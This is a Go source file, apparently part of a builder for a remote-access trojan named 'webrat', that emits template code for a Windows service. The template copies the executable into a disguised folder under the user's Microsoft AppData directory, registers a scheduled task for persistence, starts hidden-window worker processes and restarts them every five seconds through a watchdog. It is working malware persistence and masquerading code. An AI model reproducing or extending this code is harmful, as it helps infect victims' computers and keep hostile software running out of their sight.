package buildergen

import "strings"

func templateProcess() string {
	return strings.TrimSpace(`
const stillActive uint32 = 259

type webratService struct{}

func isProcessRunning(pid int) bool {
	if pid <= 0 {
		return false
	}
	h, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, uint32(pid))
	if err != nil {
		return false
	}
	defer windows.CloseHandle(h)
	var code uint32
	if err := windows.GetExitCodeProcess(h, &code); err != nil {
		return false
	}
	return code == stillActive
}

func (s *webratService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (bool, uint32) {
	const accepted = svc.AcceptStop | svc.AcceptShutdown
	changes <- svc.Status{State: svc.StartPending}

	workerPath := filepath.Join(os.Getenv(getAppDataEnvName()), getMicrosoftDirName(), getWindowsDirName(), getWorkerExeName())

	servicePid := os.Getpid()
	workerPid := 0
	startWorker := func() int {
		cmd := exec.Command(workerPath, "worker", strconv.Itoa(servicePid))
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if err := cmd.Start(); err != nil {
			return 0
		}
		return cmd.Process.Pid
	}

	go func() {
		for {
			time.Sleep(5 * time.Second)
			if !isProcessRunning(workerPid) {
				workerPid = startWorker()
			}
		}
	}()

	changes <- svc.Status{State: svc.Running, Accepts: accepted}

	for {
		select {
		case c := <-r:
			switch c.Cmd {
			case svc.Interrogate:
				changes <- c.CurrentStatus
			case svc.Stop, svc.Shutdown:
				changes <- svc.Status{State: svc.StopPending}
				return false, 0
			}
		}
	}
}

func runPrimaryWithWorker() {
	log.Println("[runPrimary] entered")
	exePath, err := os.Executable()
	if err != nil {
		log.Println("[runPrimary] os.Executable error:", err, "-> loopA")
		loopA()
		return
	}
	log.Println("[runPrimary] exePath=", exePath)

	disguisedDir := filepath.Join(os.Getenv(getLocalAppDataEnv()), getMicrosoftDirName(), getDisguiseDir())
	disguisedPath := filepath.Join(disguisedDir, getDisguisedExeName())
	log.Println("[runPrimary] disguisedDir=", disguisedDir)
	log.Println("[runPrimary] disguisedPath=", disguisedPath)

	copied := false
	if err := os.MkdirAll(disguisedDir, 0755); err == nil {
		log.Println("[runPrimary] MkdirAll OK")
		if cpErr := copyFile(exePath, disguisedPath); cpErr == nil {
			if _, statErr := os.Stat(disguisedPath); statErr == nil {
				copied = true
				log.Println("[runPrimary] copy+stat OK")
			} else {
				log.Println("[runPrimary] stat after copy FAILED:", statErr)
			}
		} else {
			log.Println("[runPrimary] copyFile FAILED:", cpErr)
		}
	} else {
		log.Println("[runPrimary] MkdirAll FAILED:", err)
	}
	if !copied {
		disguisedPath = exePath
		log.Println("[runPrimary] fallback disguisedPath=exePath")
	}

	log.Println("[runPrimary] opSetupTask with path=", disguisedPath)
	opSetupTask(disguisedPath)

	exeNorm, _ := filepath.Abs(exePath)
	disguisedNorm, _ := filepath.Abs(disguisedPath)
	log.Println("[runPrimary] exeNorm=", exeNorm, "disguisedNorm=", disguisedNorm)
	if !strings.EqualFold(exeNorm, disguisedNorm) {
		log.Println("[runPrimary] launching disguised copy as worker")
		cmd := exec.Command(disguisedPath, "worker")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if err := cmd.Start(); err == nil {
			log.Println("[runPrimary] worker launched pid=", cmd.Process.Pid, "-> returning")
			return
		} else {
			log.Println("[runPrimary] worker launch FAILED:", err)
		}
	} else {
		log.Println("[runPrimary] paths equal, skipping worker launch")
	}

	log.Println("[runPrimary] fallthrough to loopA")
	loopA()
}

func runWorkerGuard() {
	_ = setupLogger()
	log.Println("[workerGuard] entered, calling loopA")
	loopA()
}
`)
}